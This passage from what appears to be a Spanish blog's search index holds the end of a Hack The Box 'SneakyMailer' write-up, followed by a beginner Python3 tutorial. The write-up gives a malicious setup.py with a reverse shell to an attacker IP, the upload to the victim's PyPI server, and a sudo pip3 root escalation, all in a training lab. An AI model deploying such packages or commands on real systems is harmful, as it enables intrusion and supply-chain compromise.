htb server {	listen 0. 0. 0. 0:8080 default_server;	listen [::]:8080 default_server;	server_name _;}server {	listen 0. 0. 0. 0:8080;	listen [::]:8080;	server_name pypi. sneakycorp. htb;	location / {		proxy_pass http://127. 0. 0. 1:5000;		proxy_set_header Host $host;		proxy_set_header X-Real-IP $remote_addr;	}}Agregamos el subdominio al /etc/hosts ❯ echo  10. 10. 10. 197 pypi. sneakycorp. htb  &gt;&gt; /etc/hostsLo abrimos en el navegador Como vemos un pypi server lo que podriamos hacer es tratar de crearnos nuestro propio paquete malicioso de pypi y tratar de subirlo a la maquina victima e intentar colar un comando en la maquina victima. Ahora la pregunta es como creamos un paquete en python? Solo debes seguir la guia de este recurso donde se explica a detalle como hacerlo  https://www. linode. com/docs/guides/how-to-create-a-private-python-package-repository/La estructura al crear un paquete debe ser similar a esta: linode_example/  linode_example/    __init__. py  setup. py  setup. cfg  README. mdEntonces procederemos a crear una estructura similar en nuestra maquina en este caso pondre de nombre a los directorios como package ❯ ls package  setup. cfg  setup. py❯ tree. ├── package│   ├── __init__. py│   └── package├── setup. cfg└── setup. py2 directories, 3 filesLo siguiente sera editar el setup. py, donde ademas añadiremos un codigo para ejecutarnos una reverse shell que se ejecutara cuando se inicie el setup. py from setuptools import setupimport socket,subprocess,oss=socket. socket(socket. AF_INET,socket. SOCK_STREAM)s. connect(( 10. 10. 16. 2 ,443))os. dup2(s. fileno(),0)os. dup2(s. fileno(),1)os. dup2(s. fileno(),2)p=subprocess. call([ /bin/sh , -i ])setup(  name='linode_example',  #packages=['linode_example'],  description='Hello world enterprise edition',  version='0. 1',  url='http://github. com/example/linode_example',  author='Linode',  author_email='docs@linode. com',  keywords=['pip','linode','example']  )Comentar o borrar la linea de packages=['linode_example'] ya que suele dar problema. Ahora lo que tenemos que hacer es que el servidor de la maquina victima al momento de instalar el paquete me ejecute la reverse shell y eso lo hariamos creando un archivo . pypirc donde definamos cual es el repositorio al cual te quieras conectar y las credenciales de autenticación que de antes la tenemos. ❯ /bin/cat ~/. pypirc[distutils]index-servers = sneakypwned[sneakypwned]repository: http://pypi. sneakycorp. htb:8080/username: pypipassword: soufianeelhaouiPor ultimo sera ejecutar el siguiente comando para tratar de cargar el paquete en la maquina victima python3 setup. py sdist upload -r linode Donde reeemplazaremos linode por el nombre que pusimos el el index-servers en el . pypirc que en nuestro caso es sneakypwned python3 setup. py sdist upload -r sneakypwnedEjecutamos el setup. py y nos ponemos en escucha con ncat ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 16. 2. Ncat: Connection from 10. 10. 16. 2:46076. # whoamiroot# pwd/home/fmiracle/Machines/Sneakymailer/content/create#Pero vemos que nos hace una conexión a nuestra propia maquina, esto es por que primero se ejecuta la conexión locamente Lo que debemos hacer es volver a ponernos en escucha con ncat y salir de nuestra conexión local con un exit esto hara que se ejecute la conexión esta vez de la maquina victima. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 16. 2. Ncat: Connection from 10. 10. 16. 2:37168. # whoamiroot# pwd/home/fmiracle/Machines/Sneakymailer/content/create# exitrunning sdistrunning egg_infowriting linode_example. egg-info/PKG-INFOwriting dependency_links to linode_example. egg-info/dependency_links. txtwriting top-level names to linode_example. egg-info/top_level. txtreading manifest file 'linode_example. egg-info/SOURCES. txt'writing manifest file 'linode_example. egg-info/SOURCES. txt'warning: sdist: standard file not found: should have one of README, README. rst, README. txt, README. mdrunning checkcreating linode_example-0. 1creating linode_example-0. 1/linode_example. egg-infocreating linode_example-0. 1/packagecopying files to linode_example-0. 1. . . copying setup. cfg -&gt; linode_example-0. 1copying setup. py -&gt; linode_example-0. 1copying linode_example. egg-info/PKG-INFO -&gt; linode_example-0. 1/linode_example. egg-infocopying linode_example. egg-info/SOURCES. txt -&gt; linode_example-0. 1/linode_example. egg-infocopying linode_example. egg-info/dependency_links. txt -&gt; linode_example-0. 1/linode_example. egg-infocopying linode_example. egg-info/top_level. txt -&gt; linode_example-0. 1/linode_example. egg-infocopying package/__init__. py -&gt; linode_example-0. 1/packageWriting linode_example-0. 1/setup. cfgCreating tar archiveremoving 'linode_example-0. 1' (and everything under it)running uploadSubmitting dist/linode_example-0. 1. tar. gz to http://pypi. sneakycorp. htb:8080/Server response (200): OKRecibimos la conexión desde la maquina victima como el usuario low ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 197. Ncat: Connection from 10. 10. 10. 197:45570. $ whoamilow$ hostname -I10. 10. 10. 197 dead:beef::250:56ff:feb9:6b16 Realizamos nuevamente un tratamiento de la tty como ya hicimos anteriormente, nos dirigimos al directorio personal del usuario y podemos visualizar la primera flag user. txt low@sneakymailer:/$ cd /homelow@sneakymailer:/home$ lslow vmaillow@sneakymailer:/home$ cd low/low@sneakymailer:~$ cat user. txt 4a39c61b14f3e1c7c83014390f90942elow@sneakymailer:~$ Escalada de privilegios #: Ejecutamos el comando sudo -l para ver si tenemos privilegios a nivel de sudoers y vemos que tenemos uno asociado al comando pip3 el cual podemos ejecutar como root de forma temporal sin requerir contraseña. low@sneakymailer:~$ sudo -lsudo: unable to resolve host sneakymailer: Temporary failure in name resolutionMatching Defaults entries for low on sneakymailer:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser low may run the following commands on sneakymailer:  (root) NOPASSWD: /usr/bin/pip3Lo siguiente sera dirigirnos a nuestra web de confianza  https://gtfobins. github. io/ahi podemos ver que si tenemos el privilegio de sudo en pip3, debemos ejecutar los siguentes comandos y nos convertiremos en el usuario root low@sneakymailer:~$ TF=$(mktemp -d)low@sneakymailer:~$ echo  import os; os. execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')  &gt; $TF/setup. pylow@sneakymailer:~$ sudo pip install $TFsudo: unable to resolve host sneakymailer: Temporary failure in name resolution[sudo] password for low: low@sneakymailer:~$ TF=$(mktemp -d)low@sneakymailer:~$ echo  import os; os. execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')  &gt; $TF/setup. pylow@sneakymailer:~$ sudo pip3 install $TFsudo: unable to resolve host sneakymailer: Temporary failure in name resolutionProcessing /tmp/tmp. 25RDYk7IwK# whoamirootFinalmente podemos dirigirnos al directorio de root y visualizar la segunda flag root. txt :) # cd /root# cat root. txt25ae2132a2ff299928b234e186ad53ec"
    }, {
    "id": 6,
    "url": "http://localhost:4000/articulos/Python3",
    "title": "Python3",
    "body": "2023/03/30 - En esta ocasion hablaremos del lenguaje de programacion Python3, realizaremos todo un curso completo desde lo mas basico y explicaremos todo lo escencial para que se pueda llegar a dominar este lenguaje.  El articulo se ira actualizando constantemente Que es Python3?Python3 es un lenguaje de programación ampliamente utilizado en las aplicaciones web, el desarrollo de software, la ciencia de datos y el machine learning. Es preferido entre los desarrolladores porque es eficiente y fácil de aprender, además de que se puede ejecutar en muchas plataformas diferentes, se integra bien a todos los tipos de sistemas y aumenta la velocidad del desarrollo. El software podemos descargarlo gratis de su pagina oficial. Indice y Estructura:  Que es Python3 Sintaxis Variables     Tipos de Variables   Asignación Multiple de Variables   Sintaxis de Variables    Strings     Indexación   Slicing   Stride   Modificación de Strings   Strings de multiples lineas    Numeros     Numeros Enteros   Numeros Flotantes   Numeros Complejos    Comentarios     Comentarios de Varias Lineas    Operadores Aritmeticos     Suma y Resta         Sumar y restar datos Numericos     Sumar y restar datos Strings          Multiplicación y División         Multiplicar y dividir datos Numericos     Multiplicar y dividir datos Strings          Modulo   Exponencial   Division Entera    Operadores de Asignación Booleanos Operadores de Comparación     Comparación entre datos numericos   Comparación entre datos strings    Operadores de Identidad Operadores de Pertenencia Operadores Logicos     Operador not   Operador or   Operador and    Listas     Acceso a elementos de una lista   Operaciones con listas   Listas anidadas   Las listas son mutables   Sintaxis #Cuando hablamos de la sintaxis en Python3, nos referimos como en todo lenguaje al correcto uso y orden de las palabras que utilizamos para comunicarnos. Por ello, en Python3 también es necesario cumplir ciertos requisitos a la hora de expresarnos. Comenzaremos con la sintaxis tipica que nos ayuda a imprimir los valores concretamente su nombre es print que viene a ser una funcion interna de Python que recibe una variable o tipo de dato y nos lo muestra por pantalla, por ahora solo hay que tener presente el concepto de print ya que mas adelante profundizaremos en los demas conceptos que nos ayudaran a comprender mejor como funciona este lenguaje. print( Hola Python3 )Hola Python3Variables #Una variable es un elemento de un lenguaje de programación que tiene asignado un valor determinado. Para crear una variable en Python3 debemos proporcionarle un nombre y asignarle un valor utilizando el símbolo =. variable =  Hola Python3 print(variable)Hola Python3Ahora el valor asignado a la variable puede cambiar a lo largo del codigo a otra difierente. variable =  Hola Python3 print(variable)Hola Python3variable2 =  Adios Python3 print(variable)Adios Python3Tipos de Variables: Existen 4 tipos de variables principales o primitivas en Python3, concretamente estas son: Tipoint: Para representar numeros enteros. Tipo string: Para representar texto o cadenas. Tipo boolean: Para representar datos binarios, es decir que pueden tomar los valores True o False. Tipo float: Para representar numeros con decimales.       Representacion   Tipo         numeros enteros   int       cadenas de texo   string       numeros decimales   float       dato binario(True o False)   boolean   Definimos un conjunto de variables segun su tipo y usamos la funcion reservada de python type() para ver el tipo de variable segun su asignacion: variable1 = 10variable4 = 2. 4variable2 =  Hola Python variable3 = Truevariable4 = 2. 4type(variable1)inttype(variable2)strtype(variable3)booltype(variable4)floatAsignación Multiple de Variables: En Python3 podemos asignar una variable a otra variable diferente. variable =  Hola Python3 variable2 = variableprint(variable2)Hola Python3Sintaxis de Variables: En Python3 se debe cumplir con las reglas sintácticas definidas por el leguaje. A continuación indicamos las reglas que debemos cumplir cuando definimos el nombre de una variable:  Las variables en Python3 pueden tener cualquier longitud y pueden consistir en letras mayúsculas y minúsculas A-Z, a-z, dígitos del 0-9 y el carácter de subrayado o subguion __variable =  Hola Python3 print(_variable)Hola Python3vAriAbLe =  Hola Python3 print(vAriAbLe)Hola Python3variable_1_1 =  Hola Python3 print(variable_1_1)Hola Python3 Si no se cumple con las reglas definidas de sintaxys, emitiran un error variable$ =  Hola Python3   File  &lt;iPython3-input-12-f520f3dd0eb3&gt; , line 1   variable$ =  Hola Python3      ^ SyntaxError: invalid syntax El nombre de una variable puede contener dígitos, pero el primer caracter de un nombre de variable no puede ser un dígito.  1variable =  Hola Python3   File  &lt;iPython3-input-13-905ee4ad3fed&gt; , line 1   1variable =  Hola Python3    ^ SyntaxError: invalid syntax El nombre de las variables en Python3 es sensible a mayúsculas y minúsculas  Variable1 =  Hola Python3   print(variable1)  ---------------------------------------------------------------------------  NameError                 Traceback (most recent call last)  &lt;iPython3-input-15-32693f267891&gt; in &lt;module&gt;  ----&gt; 1 print(variable1)  NameError: name 'variable1' is not definedStrings #Un string se corresponde con un conjunto de caracteres que forman una cadena de texto. La sintaxis que debemos utilizar para definir strings en Python consiste en situar los caracteres entre   o ' variable1 =  Esto es mi primer string variable2 = 'Esto es mi segunda string'La flexibilidad de definir string con el caracter “ y el caracter ‘ nos permite definir cadenas de texto que contienen esos mismos caracteres. variable1 = 'Los tipos strings pueden definirse con el caracter  'variable2 =  Los tipos strings pueden definirse con el caracter ' print(variable1)Los strings pueden definirse con el caracter  print(variable2)Los strings pueden definirse con el caracter 'Indexación: En muchos tipos de datos en Python3 se puede acceder a los elementos individuales de un conjunto de datos directamente mediante un índice numérico o un valor clave. Este proceso se denomina indexación. En Python3, las cadenas son secuencias ordenadas de caracteres, y por lo tanto pueden ser indexadas de esta manera. Se puede acceder a los caracteres individuales de una cadena especificando el nombre de la cadena seguido de un número entre corchetes []. El primer carácter de la cadena tendra el índice 0, el siguiente el índice 1, y así sucesivamente. El índice del último carácter será la longitud de la cadena menos uno. lenguaje =  Python lenguaje[0]'P'lenguaje[2]'t'Podemos tambien utilizar números negativos para extraer los caracteres por el final de la cadena de texto, donde -1 seria la parte final y asi sucesivamente de derecha a izquierda. lenguaje[-1]'n'lenguaje[-3]'h'Slicing: Python3 permite una sintaxis específica de indexación que extrae subcadenas de una cadena de texto, a esto se denomina ‘slicing. La sintaxis que se utiliza para extraer una subcadena de una cadena de nombre micadena es de la forma micadena[x:y], esto devuelve la parte de la cadena micadena que comienza en la posición x,y termina en la posición y; con la exepción de que no se incluye el último caracter. lenguaje =  Hola Python lenguaje[0:4]'Hola'lenguaje[-6:-1]'Pytho'Podemos observar que efectivamente no se incluye el ultimo caracter que se especifica: ojo tener en cuenta que los espacios tambien son caracteres correspondientes a una cadena vacia Pero que pasaria entonces si no indicamos uno de los numeros: lenguaje =  Hola Python lenguaje[-6:]'Python'lenguaje[5:]'Python'Si no indicamos alguno de los numeros lo que hace Python3 es leer hasta el final. Stride: Es una variante más del slicing. Si se añade un : adicional y un tercer índice, se designa una stride, que indica cuantos caracteres saltar hasta obtener el siguiente caracter. Este salto lo hara contando el propio caracter. lenguaje =  Hola Python lenguaje[0:4:2]'Hl'lenguaje[0:4:1]'Hola'nombre[0:8:3]'ha'Modificación de Strings: Una string es un tipo de dato que en Python3 se considera inmutable, esto quiere decir que no podemos modificar una parte de un string asociada a una variable lenguaje =  Python lenguaje[2]'t'lenguaje[2] = 'a'---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-37-3f77b4874756&gt; in &lt;module&gt;----&gt; 1 lenguaje[2] = 'a'TypeError: 'str' object does not support item assignmentPero a pesar de no poderse modificar el contenido de una string, si se puede asignar un string diferente a la variable. lenguaje =  golang print(lenguaje)golangStrings de multiples lineas: Si en alguna ocasion queremos definir strings de varias lineas podemos hacerlo de varias formas en Python3 Una de ellas seria introducir el caracter \n en la posicion de la cadena donde queremos que realize el salto de linea lenguaje =  Mi\nlenguaje\nfavorito\nes\nPython print(lenguaje)MilenguajefavoritoesPythonOtra opción tambien podria usar los caracteres     lenguaje =    MilenguajefavoritoesPython   print(lenguaje)MilenguajefavoritoesPythonNumerosExisten 3 tipos de datos numéricos: enteros int, números de punto flotante float y números complejos. Numeros Enteros: Los números enteros son aquellos que no tienen parte decimal. En Python3 se referencian con la palabra int. num = 10No olvidemos que es muy importante la diferencia de un número entero y una cadena de texto que representa un número entero. num = 10num =  10 Podemos convertir una cadena de texto que representa un número entero en un valor numérico utilizando la función int() numero =  10 print(numero)'10'numero2 = int(numero)print(numero2)10Para separar algunos dígitos para que sea más facil de leer. No podemos usar el . o , , para esto Python3 nos da la opcion de usar _: numero = 5000000print(numero)5000000numero2 = 5_000_000print(numero2)5000000No hay límite en el tamaño de los números enteros que podemos definir, ya que se pueden definir números enteros tan grandes como la memoria de nuestro sistema soporte. numeroprint(numeroumeros Flotantes: Los números flotantes son aquellos que tienen una parte decimal, en Python3 se referencian con la palabra float. numero = 10. 5De igual manera que con los números enteros, se puede convertir una cadena de texto que representa un número flotante a un valor numérico utilizando la función float() numero =  12. 4 print(numero)'12. 4'numero2 = float(numero)print(numero2)12. 4Existen tres formas de representarlos en Python3. numero1 = 1000. 0numero2 = 1_000. 0numero3 = 1e3print(numero1)1000. 0print(numero2)1000. 0print(numero3)1000. 0A diferencia que los números enteros, los número de flotantes si tienen un tamaño máximo en Python3. Aunque el tamaño máximo dependera de nuestro sistema, las cifras cercanas o mayores a 2e400 que equivale a (2x10)^400 suelen superar el tamaño máximo. numero = 2e400print(numero)infPython3 devuelve inf haciendo referencia a infinito. Numeros complejos: Hay pocos lenguajes de programacion que ofrecen soporte integrado para números complejos y Python3 es uno de ellos. Aunque los números complejos no suelen aparecer fuera de los dominios de la computación científica, pueden ser de gran utilidad en dominios que usen técnicas estadísticas. Un número complejo esta formado por 2 componentes distintos: una parte real y una parte imaginaria. En Python3 podemos definir un numero complejo, se define la parte real seguida de un símbolo + y la parte imaginaria terminando con la letra j. numero = 2 + 4jprint(numero)(2+4j)numero. real2. 0numero. imag4. 0Comentarios #Los comentarios son parte fundamental en cualquier lenguaje de programación. Permiten describir partes del código que desarrollamos de manera que sea mucho más facil de comprender. Poner comentarios en nuestro código es una muy buena práctica que debemos realizar. La manera más simple de poner comentarios en Python3 es utilizando el símbolo # # Este es mi comentarioPodemos hacer lo mismo despues de escribir una sentencia en nuestro codigo haciendo referencia al significado de esta: variable =  Hola Python3  # Esto es una variableComentarios de varias lineas: Hay ocasiones en que necesitemos poner comentarios de varias líneas. Python3 no permite crear un comentario de varias líneas utilizando el mismo símbolo #. # Este comentario# tiene varias lineas# para mi ejemplo en Python3Existe una manera mas sencilla y comoda de hacer comentarios en Python3 con el uso de     todo el comentario    .    Este comentariotiene varias líneaspara mi ejemplo en Python3   Operadores Aritmeticos #A continuación se muestran los operadores aritméticos soportados por Python3:       Operador   Significado         a + b   suma       a - b   resta       a * b   multiplicacion       a / b   division       a % b   modulo       a // b   division de enteros       a ** b   exponencial   Suma y Resta: Los operadores suma +y resta - se pueden aplicar a distintos tipos de datos. Sumar y restar datos numericos: Al sumar o restar tipos de datos numericos obtenemos el resultado matematico. numero1 = 10numero2 = 8print(numero1 + numero2)18print(numero1 - numero2)8print(numero2 - numero1)-2numero3 = 2. 5numero4 = 1. 5print(numero3 + numero4)4. 0print(numero3 - numero4)1. 0Sumar y restar datos strings: Cuando sumamos tipos de datos strings se concatenan las variables. texto1 =  Hola texto2 =  Python print(texto1 + texto2)'HolaPython'Si queremos agregar un espacio, debemos agregar una cadena vacia    , sin embargo no podemos restar dichas cadenas. print(text1 +     + text2)'Hola Python'print(texto1 - texto2)---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-16-ed11b0c86524&gt; in &lt;module&gt;----&gt; 1 texto1 - texto2TypeError: unsupported operand type(s) for -: 'str' and 'str'Multiplicación y División: Los operadores de multiplicacion * y division / son operadores binarios que pueden aplicarse sobre distintos tipos de datos. multiplicar y dividir datos numericos: numero1 = 20numero2 = 4numero1 * numero280# IMPORTANTE: El resultado al dividir siempre es un floatprint(numero1 / numero2)5. 0multiplicar y dividir datos strings: No podemos multiplicar o dividir cadenas de texto. texto1 =  Hola texto2 =  Python texto1 * texto2---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-21-4d766fa04d9a&gt; in &lt;module&gt;----&gt; 1 texto1 * texto2TypeError: can't multiply sequence by non-int of type 'str'print(texto1 / texto2)---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-22-7ba20b66d6c5&gt; in &lt;module&gt;----&gt; 1 texto1 / texto2TypeError: unsupported operand type(s) for /: 'str' and 'str'Pero si podemos multiplicar una cadena de texto por un numero entero, que imprime el numero de veces de la cadena segun el que numero por el que multiplicamos. texto1 * 3'HolaHolaHola'Modulo: El operador modulo % es un operador binario que devuelve el resto de una división entre tipos de datos numericos ya sean enteros o flotantes. numero1 = 10numero2 = 7print(numero1 % numero2)3print(numero2 % numero1)7numero1 = 10. 5numero2 = 7. 2print(numero1 % numero2)3. 3Exponencial: El operador exponencial ** es un operador binario que se aplica solo en tipos de datos numéricos. numero1 = 5numero1 ** 225numero ** 3125texto1 =  Hola Python texto1 ** 2---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-33-a3cd4ee7680f&gt; in &lt;module&gt;----&gt; 1 texto1 ** 2TypeError: unsupported operand type(s) for ** or pow(): 'str' and 'int'Division Entera: El operador divison entera //es un operador binario que se aplica sobre tipos de datos numéricos y devuelve la parte entera del resultado. numero1 = 10numero2 = 7print(numero1 / numero2)1. 4285714285714286print(numero1 // numero2)1Operadores de Asignación #Anteriormente ya hemos usado el operador de asignación = para asignar un valor a una variable. Sin embargo Python3 nos proporciona un mecanismo para combinar operadores aritméticos y operadores de asignación simplificando nuestro codigo. Esa combinación se denomina Augmented Assignment.       Operador       Significado         a += 4   es igual a   a = a + 4       a -= 8   es igual a   a = a - 8       a *= 10   es igual a   a = a * 10       a /= 5   es igual a   a = a / 5   Veamos unos ejemplos: numero = 15numero += 5print(numero)20numero2 = 20numero2 *= 2print(numero2)40numero3 = 8numero3 -= 3print(numero3)5Booleanos #Los tipos de datos Boolenos en Python se representan con el tipo bool y reciben únicamente dos posibles valores:  True Fasevariable = Trueprint(variable)TruePodemos usar la funcion reservada type para ver el tipo de variable variable = Truetype(varaible)boolvariable2 = Falsetype(variable2)boolUna cosa a tener en cuenta es que las palabras True y False son palabras reservadas dentro de Python3 y no se les puede asignar ningún valor. True =  Hola Python  File  &lt;ipython-input-7-31dbcec71c48&gt; , line 1  True =  Hola Python   ^SyntaxError: cannot assign to TrueOperadores de Comparación #Son los que evalúan la relación que existe entre dos valores en Python. Existen diferentes tipos:       Operador   Ejemplo   Significado         ==   a == b   Igual a       !=   a != b   No igual a       &lt;   a &lt; b   Menor que       &lt;=   a &lt;= b   Menor que o igual a       &gt;   a &gt; b   Mayor que       &gt;=   a &gt;= b   Mayor que o igual a   Comparación entre datos numericos: A continacion veremos algunos ejemplos numero1 = 4numero2 = 8numero1 == 4Truenumero1 == numero2Falsenumero1 == 4. 0Truenumero1 != 4Falsenumero1 != numero2TrueOtros ejemplos numero1 = 10numero2 = 15numero1 &lt; numero2Truenumero2 &lt; numero1Falsenumero1 &lt;= 10. 0TrueComparación entre datos strings: texto1 =  cadena de texto texto2 =  cadena de texto 2 texto1 ==  cadena de texto Truetext1 == text2Falsetext1 != text2TrueAhora veamos un tipo de comparación mas inusual texto1 =  Cadena de mi texto texto2 =  texto texto1 &lt; texto2TruePodemos ver algo muy extraño  Esta comparación utiliza un orden lexicográfico: primero se comparan los dos primeros elementos, y si estos son diferentes, determina el resultado de la comparación; si son iguales, se comparan los dos siguientes elementos, y así sucesivamente, hasta que se agote cualquiera de las dos secuencias. y ahora se preguntaran si segun el principio tenemos arriba como primer caracter de texto1 -&gt; C y de texto2 -&gt; t como entonces lo esta haciendo? Pues esto es por la sencilla razon de que esta comparacion lo realiza utilizando los equivalentes numericos de cada caracter, esto mediante la funcion reservada ord()que recibe un caracter y se encarga de transformar un caracter a codigo unicode. Veamoslo mejor con el ejemplo anterior: #texto1 =  Cadena de mi texto #texto2 =  texto #condicion texto1 &lt; texto2 Cadena de mi texto  &lt;  texto True#Cojemos los primeros caracteres de ambas variables y les aplicamos la funcion ord()ord('C')67ord('t')116#tendriamos que C = 67 y t = 11667 &lt; 116TrueDespues de analizar el ejemplo anterior, efectivamente vemos que la condicion era cierta y ahora nos queda claro como es que funciona. Operadores de Identidad #Los operadores de identidad se utilizan para comparar objetos. Sin embargo, no comparan si los objetos son iguales, en su lugar, comparan si son el mismo objeto:       Operador   Ejemplo   Significado         is   x is y   Devuelve True si las dos variables son el mismo objeto       is not   x is not y   Devuelve `True si las dos variables no son el mismo objeto   Veamoslo mejor en un caso practico: tenemos dos variables: texto1 =  Hola Python text2 =  Hola Python Vemos que ambas variables tienen el mismo valor, pero si aplicamos la funcion reservada id() en cada variable nos da un valor diferente. id(texto1)140608469061488id(texto2)140608469060976Te preguntaras a que corresponde el valor que nos muestra despues de aplicar la funcion; pues el resultado viene a ser el valor de la porcion de memoria que se le asigna a esa variable en ese preciso momento, ya que si volvemos a crear la misma variable con el mismo valor de nuevo nos mostrara un valor diferente. texto1 =  Hola Python id(texto1)140608469400944Ahora aplicaremos la comparacion de indentidad a nuestras dos variables previamente creadas: texto1 is texto2Falsetexto1 == texto2TrueEn el resultado podemos apreciar que is nos devuelve False a diferencia de cuando aplicamos == que nos devuelve True: Esto se debe a que == solo nos compara que las variables contengan el mismo valor, pero el is nos compara que ambas variables sean el mismo objeto creado en la misma porcion de memoria en otras palabras si tienen el mismo identificador que nos mostraba la funcion id(). Como en el caso siguente que crearemos una nueva variable texto3 y la igualaremos a la anterior variable que creamos texto1, en este caso la variable texto3 heredara todo de la variable texto1 esto incluye la porcion de memoria en la que se creo. Por lo tanto a la hora de ejecutar nuevamente el operador de identidad is esta vez nos dara el valor de True. texto3 = texto1texto3 is texto1TrueOperadores de Pertenencia #: Los operadores de pertenencia se utilizan para evaluar sin una secuencia se encuentra presente en un objeto.       Operador   Ejemplo   Significado         in   x in y   Devuelve True si la secuencia x se encuntra presente en y, de lo contrario devuelve False       not in   x not in y   Devuelve True si la secuencia x no se encuentra en y, de lo contrario devuelve False   Veamoslo en un ejemplo: Obervamos que si la secuencia en este caso cadena esta presente en la variable texto, esto nos responde True ya que solo debe incluirse para que se cumpla esta condicion. texto =  Mi cadena de texto  cadena  in textoTrue hola  in textoFalse e  in textTruePero si intentamos hacer el mismo proceso en un numero entero, recibimos un error ya que el operador in solo sirve para secuencias que son iterables num = 13456781 in numero---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-7-882699b1f88c&gt; in &lt;module&gt;----&gt; 1 1 in numeroTypeError: argument of type 'int' is not iterableOperadores Logicos #: Los operadores lógicos modifican y unen expresiones evaluadas en contexto booleano para crear condiciones más complejas.       Operador   Ejemplo   Significado         not   not x   Devuelve True si x el False, de lo contrario devuelve True       or   x or y   Devuelve True si x o y son True, de lo contrario devuelve False       and   x and y   Devuelve True si ambos x como y son True, de lo contrario devuelve False   Operador not: Evaluamos la expresion y con not invierte el valor que nos devuelve una expresion numero = 10numero &lt; 20Truenot numero &lt; 20FalseOperador or: Observamos que el resultado nos devuelve True, puesto que si bien la primera condicion es False, con el uso del operador or solo necesita devolver una de ellas True, concretamente ya que la segunda condicion si se cumplia. numero1 = 10numero2 = 20numero1 &lt; 5Falsenumero1 &lt; 5 or numero2 &gt; 10TrueOperador and: El operador and si requiere que se cumpla la evaluacion de todas las expresiones para que devuelva un valor True numero1 = 5numero2 = 10numero1 &lt; 8 and numero2 &gt; 15Falsenumero1 &lt; 10 and numero2 &gt; 7TrueListas #Las listas son un tipo de dato complejo y particular en Python3. Una lista se corresponde con una colección arbitraria de objetos. Las listas son similares a estructuras conocidas como arrays en otros lenguajes de programación pero con la diferencia de que en Python3 aportan mas flexibilidad. En Python3 se representan con el tipo list y la sintaxis que se utiliza para definirlas consiste en indicar una lista de objetos separados entre comas y encerrados entre corchetes: [objeto1, objeto2, …, objeton] Veamoslo de manera practica  Podemos una lista con datos numericos. lista = [1, 2, 3, 4, 5]type(lista)listprint(lista)[1, 2, 3, 4, 5] Tambien crear una lista con tipo de datos stringlista2 = [ texto1 ,  texto2 ,  texto3 ]type(lista2)listprint(lista2)['texto1', 'texto2', 'texto3']Vemos que tenemos una lista igual a la anterior pero con la diferencia que esta contiene cadenas de texto.  El orden en el que se especifican los elementos cuando se define una lista es relevante y se mantiene durante toda su vida. lista = ['n1', 'n2', 'n3']print(lista)['n1', 'n2', 'n3'] Podemos comparar las listas con los operadores mencionados anteriormente. lista1 = ['n1', 'n2', 'n3']lista2 = ['n2', 'n1', 'n3']lista1 == lista2False'n1' in lista2Truelista1 in lista2Falselista1 == ['t1', 't2', 't3']Truelista1 is lista2False Las lista pueden contener distintos tipos de datos. lista = [1, 2,  hola ,  python ]print(lista)[1, 2, 'hola', 'python'] Una cosa super interesante es que una lista puede contener una función estas las veremos mas adelante pero es importante mantenerlo presente def funcion():  print( Hola python )lista = [ texto1 ,  texto2 , funcion]print(lista)['texto1', 'texto2', &lt;function funcion at 0x0000012D476D0EE0&gt;]Acceso a elementos de una lista: Todas las variaciones vistas en la sección de strings (indexing, slicing, stride) aplican a las listas. indexing: lista = [ texto1 ,  texto2 ,  texto3 ,  texto4 ,  texto5 ]lista[0]'texto1'lista[-1]'texto5'slicing: lista = [ texto1 ,  texto2 ,  texto3 ,  texto4 ,  texto5 ]lista[2:4]['texto3', 'texto4']lista[:3]['texto1', 'texto2', 'texto3']lista[2:]['texto3', 'texto4', 'texto5']stride: lista = [ texto1 ,  texto2 ,  texto3 ,  texto4 ,  texto5 ]lista[0:4:2]['texto1', 'texto3' otra cosa interesante es que podemos utilizar el concepto de stride para darle la vuelta a una lista lista['texto1', 'texto2', 'texto3', 'texto4', 'texto5']lista[::-1]['texto5', 'texto4', 'texto3', 'texto2', 'texto1'] Una de las pocas construcciones sintácticas en cuanto a la indexación que cambia entre los strings y las listas es [:].  Cuando lo usamos nos devuelve una referencia al propio objetotexto =  Hola python texto[:]'Hola python'texto[:] is textoTrue Al utilizarlo con una lista nos devuelve una copia del objetivo -&gt; ojo no el mismo. lista = [1, 2, 3, 4]lista[:][1, 2, 3, 4]lista[:] is listaFalseOperaciones con listas: Las listas soportan muchos de los operadores y funciones de Python como los que vimos anteriormente. Al sumar las listas estas se anidan lista1 = [1, 2, 3]lista2 = [4, 5, 6]lista1 + lista2[1, 2, 3, 4, 5, 6]Cuando usamos el operador de multiplicación, esto hace que se multipliquen sus mismos valores segun el numero por el cual se le multiplique. lista1 = [1, 2, 3]lista1 * 2[1, 2, 3, 1, 2, 3]Tambien podemos ver la longitud, el valor minimo y el maximo de una lista lista1 = [1, 2, 3]lista2 = [4, 5, 6]len(lista1)3min(lista1)1max(lista2)6Solo podemos hacer operaciones entre listas, ya que si tratamos de hacer operaciones con otros tipos en este caso un numero int nos arrojara un error. [1, 2, 3] + 4---------------------------------------------------------------------------TypeError                 Traceback (most recent call last)&lt;ipython-input-95-5842ff442cc5&gt; in &lt;module&gt;----&gt; 1 [1, 2, 3] + 4TypeError: can only concatenate list (not  int ) to listListas anidadas: Como mencionamos anteriormente, una lista puede contener cualquier tipo de objeto. Esto incluye otra lista. Una lista puede contener sublistas, que a su vez pueden contener sublistas, y así sucesivamente. lista = [1, [2, [3, 4], 5], 6]lista[0]1lista[1][2, [3, 4], 5]Si queremos acceder a un elemento de una sublista usaremos 